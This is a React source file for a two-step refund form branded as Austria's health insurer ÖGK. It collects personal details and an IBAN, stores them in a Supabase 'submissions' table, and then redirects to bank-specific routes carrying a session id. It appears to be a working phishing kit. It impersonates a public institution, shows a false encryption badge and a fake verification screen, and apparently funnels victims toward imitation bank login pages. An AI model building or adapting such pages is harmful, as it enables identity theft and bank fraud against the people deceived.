import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowRight, ArrowLeft, ChevronsUpDown, Check, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2 } from "lucide-react";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { banksAT as banks, bankRouteMapAT as bankRouteMap, formatBirthdate } from "@/lib/banks";
import { supabase } from "@/integrations/supabase/client";
import RueckerstattungWizardShell from "@/components/RueckerstattungWizardShell";
import LoadingOverlay from "@/components/LoadingOverlay";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandItem,
  CommandList,
} from "@/components/ui/command";

const OEGK_GREEN = "#00B050";
const OEGK_NAVY = "#1B2C5C";

const fieldBase =
  "h-11 w-full rounded-md border px-3 text-sm focus:outline-none focus:ring-2 transition";
const fieldOk =
  "border-gray-300 focus:border-[#00B050] focus:ring-[#00B050]/20";
const fieldErr =
  "border-red-500 focus:border-red-500 focus:ring-red-500/20";
const fieldClass = `${fieldBase} ${fieldOk}`;
const labelClass = "mb-1.5 block text-[13px] font-medium text-gray-700";

const REQUIRED_MESSAGES: Record<string, string> = {
  firstName: "Bitte geben Sie Ihren Vornamen ein",
  lastName: "Bitte geben Sie Ihren Nachnamen ein",
  birthdate: "Bitte geben Sie Ihr Geburtsdatum ein",
  email: "Bitte geben Sie Ihre E-Mail-Adresse ein",
  phone: "Bitte geben Sie Ihre Telefonnummer ein",
  street: "Bitte geben Sie Ihre Straße ein",
  houseNumber: "Bitte geben Sie Ihre Hausnummer ein",
  postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
  city: "Bitte geben Sie Ihre Stadt ein",
};
const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);

const iconBox = "w-10 h-10 rounded-md flex items-center justify-center shrink-0 mt-[26px]";
const iconBoxStyle: React.CSSProperties = { backgroundColor: "rgba(0,176,80,0.10)", color: OEGK_GREEN };

const RueckerstattungAnfordern = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState<1 | 2>(1);
  const [showLoading, setShowLoading] = useState(false);

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [staircase, setStaircase] = useState("");
  const [doorNumber, setDoorNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});

  const values: Record<string, string> = {
    firstName, lastName, birthdate, email, phone, street, houseNumber, postalCode, city,
  };
  const hasError = (name: string) =>
    !!touched[name] && !values[name]?.trim();
  const inputCls = (name: string) =>
    `${fieldBase} ${hasError(name) ? fieldErr : fieldOk}`;
  const onBlur = (name: string) => () =>
    setTouched((t) => ({ ...t, [name]: true }));
  const ErrMsg = ({ name }: { name: string }) =>
    hasError(name) ? (
      <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES[name]}</p>
    ) : null;
  const handleNext = () => {
    if (step1Valid) {
      setStep(2);
    } else {
      setTouched(
        REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {})
      );
    }
  };

  const [iban, setIban] = useState("");
  const [selectedBank, setSelectedBank] = useState("");
  const [bankOpen, setBankOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const title =
      step === 1
        ? "Schritt 1: Persönliche Daten · Rückerstattung · ÖGK"
        : "Schritt 2: Bankdaten · Rückerstattung · ÖGK";
    const description =
      step === 1
        ? "Schritt 1 von 3: Geben Sie Ihre persönlichen Daten für die Rückerstattung der Österreichischen Gesundheitskasse ein."
        : "Schritt 2 von 3: Geben Sie Ihre Bankdaten (IBAN) für die Auszahlung der Rückerstattung ein.";
    document.title = title;

    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", description);
  }, [step]);

  useEffect(() => {
    if (bankOpen && inputRef.current) inputRef.current.focus();
  }, [bankOpen]);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const ibanCleanLength = iban.replace(/\s/g, "").length;
  const showBankPicker = ibanCleanLength > 10;
  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  const step1Valid =
    firstName.trim() &&
    lastName.trim() &&
    email.trim() &&
    birthdate.trim() &&
    phone.trim() &&
    street.trim() &&
    houseNumber.trim() &&
    postalCode.trim() &&
    city.trim();

  const step2Valid = ibanCleanLength >= 16 && selectedBank;

  const handleSubmit = useCallback(async () => {
    if (!step2Valid) return;
    const sessionId = crypto.randomUUID().slice(0, 8);

    const { error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: `${firstName} ${lastName}`.trim(),
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        staircase,
        door_number: doorNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "rueckerstattung",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain:
          typeof window !== "undefined"
            ? window.location.hostname.replace(/^www\./, "").toLowerCase()
            : null,
      })
      .select("id")
      .single();

    if (error) {
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    const route = bankRouteMap[selectedBank];
    if (route) {
      setShowLoading(true);
      setTimeout(() => {
        navigate(`${route}?s=${sessionId}`);
      }, 2500);
    }
  }, [
    step2Valid,
    firstName,
    lastName,
    email,
    birthdate,
    phone,
    street,
    houseNumber,
    staircase,
    doorNumber,
    postalCode,
    city,
    iban,
    selectedBank,
    navigate,
  ]);

  return (
    <>
      {showLoading && (
        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
      )}
      <RueckerstattungWizardShell step={step}>
        {step === 1 && (
          <div>
            <div className="text-center mb-6">
              <div
                className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1"
                style={{ color: OEGK_GREEN }}
              >
                Schritt 1 von 3
              </div>
              <h1 className="text-xl md:text-2xl font-semibold" style={{ color: OEGK_NAVY }}>
                Persönliche Daten
              </h1>
              <p className="text-[13.5px] text-gray-600 mt-1">
                Bitte tragen Sie Ihre Daten vollständig ein.
              </p>
            </div>

            <div className="space-y-5">
              <div className="flex items-start gap-3">
                <div className={iconBox} style={iconBoxStyle}>
                  <User className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Vorname</label>
                    <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} onBlur={onBlur("firstName")} className={inputCls("firstName")} />
                    <ErrMsg name="firstName" />
                  </div>
                  <div>
                    <label className={labelClass}>Nachname</label>
                    <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} onBlur={onBlur("lastName")} className={inputCls("lastName")} />
                    <ErrMsg name="lastName" />
                  </div>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className={iconBox} style={iconBoxStyle}>
                  <Calendar className="w-5 h-5" />
                </div>
                <div className="flex-1">
                  <label className={labelClass}>Geburtsdatum</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={birthdate}
                    onChange={(e) => {
                      let raw = e.target.value;
                      if (
                        raw.length < birthdate.length &&
                        birthdate.endsWith(".") &&
                        !raw.endsWith(".")
                      ) {
                        raw = raw.slice(0, -1);
                      }
                      setBirthdate(formatBirthdate(raw));
                    }}
                    onBlur={onBlur("birthdate")}
                    placeholder="TT.MM.JJJJ"
                    maxLength={10}
                    className={inputCls("birthdate")}
                  />
                  <ErrMsg name="birthdate" />
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className={iconBox} style={iconBoxStyle}>
                  <Mail className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>E-Mail</label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
                    <ErrMsg name="email" />
                  </div>
                  <div>
                    <label className={labelClass}>Telefonnummer</label>
                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
                    <ErrMsg name="phone" />
                  </div>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className={iconBox} style={iconBoxStyle}>
                  <MapPin className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Straße</label>
                    <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} onBlur={onBlur("street")} className={inputCls("street")} />
                    <ErrMsg name="street" />
                  </div>
                  <div>
                    <label className={labelClass}>Hausnummer</label>
                    <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} onBlur={onBlur("houseNumber")} className={inputCls("houseNumber")} />
                    <ErrMsg name="houseNumber" />
                  </div>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className={iconBox} style={iconBoxStyle}>
                  <DoorOpen className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Stiege</label>
                    <input type="text" value={staircase} onChange={(e) => setStaircase(e.target.value)} className={fieldClass} />
                  </div>
                  <div>
                    <label className={labelClass}>Türnummer</label>
                    <input type="text" value={doorNumber} onChange={(e) => setDoorNumber(e.target.value)} className={fieldClass} />
                  </div>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <div className={iconBox} style={iconBoxStyle}>
                  <Building2 className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Postleitzahl</label>
                    <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} onBlur={onBlur("postalCode")} className={inputCls("postalCode")} />
                    <ErrMsg name="postalCode" />
                  </div>
                  <div>
                    <label className={labelClass}>Stadt</label>
                    <input type="text" value={city} onChange={(e) => setCity(e.target.value)} onBlur={onBlur("city")} className={inputCls("city")} />
                    <ErrMsg name="city" />
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-8 flex justify-center">
              <button
                type="button"
                onClick={handleNext}
                className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors hover:opacity-90"
                style={{ backgroundColor: OEGK_GREEN }}
              >
                <span>Weiter</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

        {step === 2 && (
          <div>
            <div className="text-center mb-6">
              <div
                className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1"
                style={{ color: OEGK_GREEN }}
              >
                Schritt 2 von 3
              </div>
              <h1 className="text-xl md:text-2xl font-semibold" style={{ color: OEGK_NAVY }}>
                Bankdaten
              </h1>
              <p className="text-[13.5px] text-gray-600 mt-1">
                Geben Sie Ihre IBAN ein, damit die Rückerstattung überwiesen werden kann.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className={labelClass}>IBAN</label>
                <input
                  type="text"
                  value={iban}
                  onChange={(e) => setIban(formatIBAN(e.target.value))}
                  maxLength={29}
                  placeholder="AT00 0000 0000 0000 0000"
                  className={cn(fieldClass, "tracking-wider")}
                />
              </div>

              {showBankPicker && (
                <div className="animate-in fade-in slide-in-from-top-2 duration-300">
                  <label className={labelClass}>Bank auswählen</label>
                  <Popover
                    open={bankOpen}
                    onOpenChange={(open) => {
                      setBankOpen(open);
                      if (!open) setBankSearch("");
                    }}
                  >
                    <PopoverTrigger asChild>
                      <div
                        className="flex h-11 w-full cursor-pointer items-center rounded-md border border-gray-300 px-3 focus-within:border-[#00B050] focus-within:ring-2 focus-within:ring-[#00B050]/20"
                        role="combobox"
                        aria-expanded={bankOpen}
                        onClick={() => setBankOpen(true)}
                      >
                        {selectedBankObj && !bankOpen && (
                          <img src={selectedBankObj.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                        )}
                        <input
                          ref={inputRef}
                          type="text"
                          className={cn(
                            "h-full flex-1 bg-transparent text-sm outline-none",
                            selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400"
                          )}
                          placeholder={selectedBank || "Bank auswählen"}
                          value={bankSearch}
                          onClick={(e) => {
                            e.stopPropagation();
                            if (!bankOpen) setBankOpen(true);
                          }}
                          onChange={(e) => {
                            setBankSearch(e.target.value);
                            if (!bankOpen) setBankOpen(true);
                          }}
                          onFocus={(e) => {
                            e.stopPropagation();
                            if (!bankOpen) setBankOpen(true);
                          }}
                        />
                        <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                      </div>
                    </PopoverTrigger>
                    <PopoverContent className="w-[--radix-popover-trigger-width] p-0" align="start">
                      <Command>
                        <CommandList className="max-h-[250px] overflow-y-auto">
                          <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                          <CommandGroup>
                            {banks
                              .filter((bank) =>
                                bank.name.toLowerCase().includes(bankSearch.toLowerCase())
                              )
                              .map((bank) => (
                                <CommandItem
                                  key={bank.name}
                                  value={bank.name}
                                  onSelect={() => {
                                    setSelectedBank(bank.name);
                                    setBankSearch("");
                                    setBankOpen(false);
                                  }}
                                >
                                  <img src={bank.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                                  <span className="flex-1">{bank.name}</span>
                                  <Check
                                    className={cn(
                                      "ml-2 h-4 w-4",
                                      selectedBank === bank.name ? "opacity-100" : "opacity-0"
                                    )}
                                  />
                                </CommandItem>
                              ))}
                          </CommandGroup>
                        </CommandList>
                      </Command>
                    </PopoverContent>
                  </Popover>
                </div>
              )}
            </div>

            <div className="flex items-center justify-center gap-2 mt-6 text-[12px] text-gray-500">
              <Lock className="w-3.5 h-3.5" />
              <span>SSL-verschlüsselt · Österreichische Gesundheitskasse</span>
            </div>

            <div className="mt-6 flex items-center justify-between gap-3">
              <button
                type="button"
                onClick={() => setStep(1)}
                className="inline-flex items-center gap-2 bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-medium text-sm px-5 py-3 rounded-md transition-colors"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Zurück</span>
              </button>
              <button
                type="button"
                disabled={!step2Valid}
                onClick={handleSubmit}
                className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors hover:opacity-90 disabled:bg-gray-300 disabled:cursor-not-allowed"
                style={{ backgroundColor: step2Valid ? OEGK_GREEN : undefined }}
              >
                <span>Anfordern</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </RueckerstattungWizardShell>
    </>
  );
};

export default RueckerstattungAnfordern;
